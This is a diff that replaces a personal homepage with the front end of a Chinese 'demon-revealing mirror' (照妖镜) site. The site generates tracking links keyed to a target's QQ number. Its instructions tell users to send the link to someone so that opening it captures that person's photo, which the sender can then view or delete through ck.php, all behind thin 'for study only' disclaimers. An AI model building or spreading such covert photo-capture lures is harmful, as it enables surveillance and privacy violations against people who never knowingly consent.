@@ -1,50 +1,201 @@
-<!--
- * AyagawaSeirin's Page
- * Last Update: 2020-02-05
- * GitHub: https://github.com/AyagawaSeirin/
- * Made with love by AyagawaSeirin [https://qwq.best/]
- * 此个人主页运行于GithubPages，如果你也想使用，在我的公开仓库内即可找到源码。您可以任意修改，但请注明本原作者。
--->
-<html lang="zh-CN">
-<head>
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
     <meta charset="utf-8">
-    <title>强忍着泪水笑着说再见 | 让我们永远在梦中相会吧</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/mdui/css/mdui.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/assets/css/main.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/assets/css/index.css">
-    <link rel="icon" href="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/assets/img/logo-circul-100.png">
-    <script>
-        var _hmt = _hmt || [];
-        (function() {
-            var hm = document.createElement("script");
-            hm.src = "https://hm.baidu.com/hm.js?c8493223ca0fc5718b7da621552fdd73";
-            var s = document.getElementsByTagName("script")[0];
-            s.parentNode.insertBefore(hm, s);
-        })();
-    </script>
-</head>
-<body>
-<div id="rin-bg"></div>
-<main id="rin-main">
-    <div id="rin-headimg"></div>
-    <div class="rin-name">留&nbsp;&nbsp;恋&nbsp;&nbsp;幻&nbsp;&nbsp;梦</div>
-  <div class="rin-description">「强忍着泪水笑着说再见 | 让我们永远在梦中相会吧」</div>
-	
-            <a class="mdui-btn mdui-btn-raised rin-btn rin-btn-blue mdui-text-capitalize" href="https://www.bilibili.com/read/readlist/rl330029/"><span class="iconfont iconBlog">美好知识的传送入口</span> </a>
-	    <a class="mdui-btn mdui-btn-raised rin-btn rin-btn-blue mdui-text-capitalize" href="https://tv.cctv.com/live/cctvchild"><span class="iconfont iconBlog">少女表演/懂得都懂</span> </a>
-<div class="rin-description">「在永恒的宅邸拉莱耶中,长眠的克苏鲁侯汝入梦」</div>
-    <div class="rin-tr"></div>
-    <a class="mdui-btn mdui-btn-raised rin-btn rin-btn-blue mdui-text-capitalize" href="https://figerous.github.io/"><span class="iconfont iconBlog"></span> More</a>
-</main>
-<footer id="rin-footer">
-    <div>公告（详情置底）| BG: <a href="https://www.pixiv.net/artworks/56652667" id="bg-link" target="_blank">Pixiv</a></div>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>照妖镜 - 某F</title>
+    <meta name="keywords" content="照妖镜,偷拍网站">
+    <meta name="description" content="打开生成的链接可拍摄对方照片">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link href="//cdn.staticfile.org/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+  <link href="//cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <script src="//cdn.staticfile.org/jquery/2.1.4/jquery.min.js"></script>
+  <script src="//cdn.staticfile.org/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  <!--[if lt IE 9]>
+    <script src="//cdn.staticfile.org/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@8"></script>
+    
+<style type="text/css">
+    .hr1{ 
+        height:1px;
+        border:none;
+        border-top:1px dashed #0066CC;
+    }
 
-    </footer>
-<script src="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/mdui/js/mdui.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/AyagawaSeirin/homepage@double/assets/js/main.js"></script>
-</body>
+	body{
+		margin: 0 auto;
+		text-align: center;
+	}
+	.container {
+	  max-width: 580px;
+	  padding: 15px;
+	  margin: 0 auto;
+	}
+</style>
+
+  <script type="text/javascript">
+    $(function () {
+      function getNowFormatDate() {
+        var date = new Date();
+        var month = date.getMonth() + 1;
+        var strDate = date.getDate();
+        var currentdate = month + "月" + strDate + "日";
+        return currentdate;
+      }
+      var text = [
+        "请勿用于非法用途，谢谢！",
+        "本站免费使用，欢迎支持我们！",
+        "目前稳定运营，有充足的服务器资源",
+        "有问题欢迎发送邮件到3274075188@qq.com",
+      ], content = "";
+      for (var i = 0; i < text.length; i++) {
+        content += (i + 1) + ". " + text[i] + "\n";
+      }
+      setTimeout(function () {
+        swal(getNowFormatDate() + "通知", content, "success");
+      }, 1000)
+    });
+    
+function create() {
+    var input = document.getElementById('content');
+    var kd = document.getElementById('kd');
+    var myid = document.getElementById('myid');
+    var url = document.getElementById('myurl');
+    if (myid.value=="" || url.value==""){
+        swal("ID或跳转地址不能为空！");
+        return false;
+    }
+    var myid1 = myid;
+    kd.href = 'http://FaroLeon.github.io/?id='+myid.value+'&url='+url.value;   //在这修改域名   替换就行
+    kd.style = ''; 
+    kd.innerText = 'https://FaroLeon.github.io/?id='+myid.value+'&url='+url.value; //两个都要替换    这就好了
+    //总结两点   配置ssl   不会百度    然后修改替换域名完事 就是这么简单 小学生基础
+
+    
+}
+  </script>
+    <!--百度提交-->
+  <script>
+    (function() {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+  </head>
+  
+  <body style="background-image: url(https://blog.mrabit.com/bing/today);">
+    <div class="container">
+    	<div class="header">
+      <ul class="nav nav-pills pull-right" role="tablist">
+        
+       <li role="presentation"><a href="https://jq.qq.com/?_wv=1027&k=wjoTSki9" target="_blank">进入官方群</a></li>
+      </ul>
+      <h3 class="text-muted" align="left">
+        <img src="/luyuz.png" width="150px" height="47px"></img><font color="#8968CD"><b>某F照妖镜</b></font>
+      </h3>
+    </div>
+<hr class="hr1">
+       <marquee style="color:red; font-size:large"><img src="https://z3.ax1x.com/2021/03/29/cC3HeJ.gif" width="35px" height="35px">欢迎使用小朋友照妖镜，请勿用于非法用途！</marquee>
+<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.8)">
+        <div class="panel-heading" style="background: linear-gradient(to right,#b221ff,#14b7ff,#8ae68a)">
+<h3 class="panel-title">生成面板</h3>
+</div>
+        <div class="panel-body">
+				<div class="panel-body">
+            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid" value= '' placeholder="请输入对方QQ生成链接，请填写数字，这是你查看照片的唯一凭证">
+               <br>
+               
+            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myurl" value= 'https://jq.qq.com/?_wv=1027&k=PmnNjWgM' placeholder="请输入上传照片后要跳转的网址">
+               <br>
+             <input type= "button" class="btn btn-primary btn-block" value= '生成链接'  onclick= 'create();'  />
+             <br>
+             <a id="kd" style="pointer-events: none;">请先生成链接！</a></br>
+		</div>
+        </div>
+      </div>
+      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
+          <div class="panel-body">
+            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid1" value= '' placeholder="请输入凭证查询照片">
+            <br>
+            <input type= "button" class="btn btn-primary btn-block" value= '查看照片'  onclick=window.location.href='ck.php?id='+document.getElementById('myid1').value> 
+             <input type= "button" class="btn btn-primary btn-block" value= '删除照片'  onclick=window.location.href='ck.php?type=dell&id='+document.getElementById('myid1').value> 
+
+           </div>
+           
+      </div>
+      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
+        <div class="panel-body">
+          <div class="alert alert-info" role="alert">
+            <br>作者声明：
+            <br>1.本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许的！
+            <br>2.凭证是查看照片的凭证,不要泄露给知道这个平台的人
+            <br>3.如有侵权、肖像权等,请联系本站下方邮箱删除！
+            <br>使用说明：
+            <br>1.填写对方QQ方便日后查询!填写完成后不用管直接点击生成!
+            <br>2.生成完成后,复制链接发给你要查询的人
+            <br>3.他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！
+            <br>4.由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行
+            <br>仅供娱乐使用,请勿用于非法商业用途,否则后果自负！
+            <font color="#e600ff"><br>站长QQ:1900380597</font>
+            <font color="#e600ff"><br>QQ群：385431695</font>
+                 
+            
+            <hr class="top_hr_style02">
+			<body bgcolor="#ffd200"><span id="localtime"></span>
+	</nav></header>
+	       <script type="text/javascript">
+                    function showLocale(objD) {
+                        var str, colorhead, colorfoot;
+                        var yy = objD.getYear();
+                        if (yy < 1900) yy = yy + 1900;
+                        var MM = objD.getMonth() + 1;
+                        if (MM < 10) MM = '0' + MM;
+                        var dd = objD.getDate();
+                        if (dd < 10) dd = '0' + dd;
+                        var hh = objD.getHours();
+                        if (hh < 10) hh = '0' + hh;
+                        var mm = objD.getMinutes();
+                        if (mm < 10) mm = '0' + mm;
+                        var ss = objD.getSeconds();
+                        if (ss < 10) ss = '0' + ss;
+                        var ww = objD.getDay();
+                        if (ww == 0) colorhead = "<font color=\"#FF3030\">";
+                        if (ww > 0 && ww < 6) colorhead = "<font color=\"#FF3030\">";
+                        if (ww == 6) colorhead = "<font color=\"#FF3030\">";
+                        if (ww == 0) ww = "星期日";
+                        if (ww == 1) ww = "星期一";
+                        if (ww == 2) ww = "星期二";
+                        if (ww == 3) ww = "星期三";
+                        if (ww == 4) ww = "星期四";
+                        if (ww == 5) ww = "星期五";
+                        if (ww == 6) ww = "星期六";
+                        colorfoot = "</font>"
+                        str = colorhead + yy + "-" + MM + "-" + dd + "丨" + hh + ":" + mm + ":" + ss + "丨" + ww + colorfoot;
+                        return (str);
+                    }
+                    function tick() {
+                        var today;
+                        today = new Date();
+                        document.getElementById("localtime").innerHTML = showLocale(today);
+                        window.setTimeout("tick()", 1000);
+                    }
+                    tick();
+                </script>
+        <p style="text-align:center">
+            &copy; Powered by
+          <a href="https://jq.qq.com/?_wv=1027&k=PmnNjWgM">?</a>!</p>
+          
+</div>
+  </body>
 </html>
-<div class="rin-description">「因为我还不会动态web后端（我想学会至少两年）所以我的双页版是由两个web前端静态的html码编成的，所以我也不知道我弄了个啥（反正又不是不能用(滑稽)）]
-）」</div>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=718551&auto=1&height=66"></iframe>
